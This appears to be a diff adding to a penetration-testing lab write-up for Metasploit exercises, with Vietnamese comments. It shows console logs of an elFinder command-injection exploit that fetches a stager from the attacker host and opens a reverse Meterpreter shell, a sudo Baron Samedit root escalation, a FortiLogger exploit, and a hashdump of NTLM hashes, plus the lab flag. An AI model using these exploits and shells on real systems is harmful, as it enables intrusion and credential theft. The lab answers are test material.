@@ -248,3 +248,130 @@ Nmap done: 1 IP address (1 host up) scanned in 27.55 seconds
 ![](images/1.png)
 
 ![](images/2.png)
+
+# Sessions
+
+
++ 1  The target has a specific web application running that we can find by looking into the HTML source code. What is the name of that web application?
+
+![](images/3.png)
+
++ 1  Find the existing exploit in MSF and use it to get a shell on the target. What is the username of the user you obtained a shell with?
+
+Để ý thằng này dùng `connector php` nên chọn module phù hợp.
+
+![](images/4.png)
+
+```zsh
+msf6 exploit(linux/http/elfinder_archive_cmd_injection) > run
+[*] Started reverse TCP handler on 10.10.14.174:4444 
+[*] Running automatic check ("set AutoCheck false" to disable)
+[+] The target appears to be vulnerable. elFinder running version 2.1.53
+[*] Uploading file KpRfe.txt to elFinder
+[+] Text file was successfully uploaded!
+[*] Attempting to create archive tHrUK.zip
+[+] Archive was successfully created!
+[*] Using URL: http://10.10.14.174:8080/3tfTm8ze9RE
+[*] Client 10.129.194.204 (Wget/1.20.3 (linux-gnu)) requested /3tfTm8ze9RE
+[*] Sending payload to 10.129.194.204 (Wget/1.20.3 (linux-gnu))
+[*] Command Stager progress -  52.21% done (59/113 bytes)
+[*] Command Stager progress -  71.68% done (81/113 bytes)
+[*] Sending stage (1017704 bytes) to 10.129.194.204
+[+] Deleted KpRfe.txt
+[+] Deleted tHrUK.zip
+[*] Meterpreter session 1 opened (10.10.14.174:4444 -> 10.129.194.204:38568) at 2025-04-22 05:01:09 -0400
+[*] Command Stager progress -  83.19% done (94/113 bytes)
+[*] Command Stager progress - 100.00% done (113/113 bytes)
+[*] Server stopped.
+meterpreter > getuid
+Server username: www-data
+meterpreter > 
+```
+
++ 2  The target system has an old version of Sudo running. Find the relevant exploit and get root access to the target system. Find the flag.txt file and submit the contents of it as the answer.
+
+![](images/5.png)
+
+```zsh
+msf6 exploit(linux/http/elfinder_archive_cmd_injection) > sessions -l
+
+Active sessions
+===============
+
+  Id  Name  Type                   Information                Connection
+  --  ----  ----                   -----------                ----------
+  1         meterpreter x86/linux  www-data @ 10.129.194.204  10.10.14.174:4444 -> 10.129.194.204:38568 (10.129.194.204)
+
+msf6 exploit(linux/http/elfinder_archive_cmd_injection) > use exploit/linux/local/sudo_baron_samedit
+[*] No payload configured, defaulting to linux/x64/meterpreter/reverse_tcp
+msf6 exploit(linux/local/sudo_baron_samedit) > set session 1
+session => 1
+msf6 exploit(linux/local/sudo_baron_samedit) > set lhost tun0
+lhost => tun0
+msf6 exploit(linux/local/sudo_baron_samedit) > run
+[*] Started reverse TCP handler on 10.10.14.174:4444 
+[!] SESSION may not be compatible with this module:
+[!]  * incompatible session architecture: x86
+[*] Running automatic check ("set AutoCheck false" to disable)
+[!] The service is running, but could not be validated. sudo 1.8.31 may be a vulnerable build.
+[*] Using automatically selected target: Ubuntu 20.04 x64 (sudo v1.8.31, libc v2.31)
+[*] Writing '/tmp/waV4zc.py' (763 bytes) ...
+[*] Writing '/tmp/libnss_P/3lVPE .so.2' (540 bytes) ...
+[*] Sending stage (3045380 bytes) to 10.129.194.204
+[+] Deleted /tmp/waV4zc.py
+[+] Deleted /tmp/libnss_P/3lVPE .so.2
+[+] Deleted /tmp/libnss_P
+[*] Meterpreter session 2 opened (10.10.14.174:4444 -> 10.129.194.204:38790) at 2025-04-22 05:18:53 -0400
+
+meterpreter > getuid
+Server username: root
+meterpreter > cat /root/flag.txt
+HTB{5e55ion5_4r3_sw33t}
+meterpreter > 
+
+```
+
+# Meterpreter
+
++ 1  Find the existing exploit in MSF and use it to get a shell on the target. What is the username of the user you obtained a shell with?
+![](images/7.png)
+Có thể dùng default login admin:admin để đăng nhập:
+
+![](images/6.png)
+
+Version 4.4.2.2 -> CÓ VULN
+
+![](images/8.png)
+```zsh
+msf6 > search fortilogger
+
+Matching Modules
+================
+
+   #  Name                                                   Disclosure Date  Rank    Check  Description
+   -  ----                                                   ---------------  ----    -----  -----------
+   0  exploit/windows/http/fortilogger_arbitrary_fileupload  2021-02-26       normal  Yes    FortiLogger Arbitrary File Upload Exploit
+
+
+Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/fortilogger_arbitrary_fileupload
+
+msf6 > 
+
+```
+
+```zsh
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+meterpreter > 
+```
+
++ 1  Retrieve the NTLM password hash for the "htb-student" user. Submit the hash as the answer.
+
+```zsh
+meterpreter > hashdump
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:bdaffbfe64f1fc646a3353be1c2c3c99:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb-student:1002:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:4b4ba140ac0767077aee1958e7f78070:::
+```
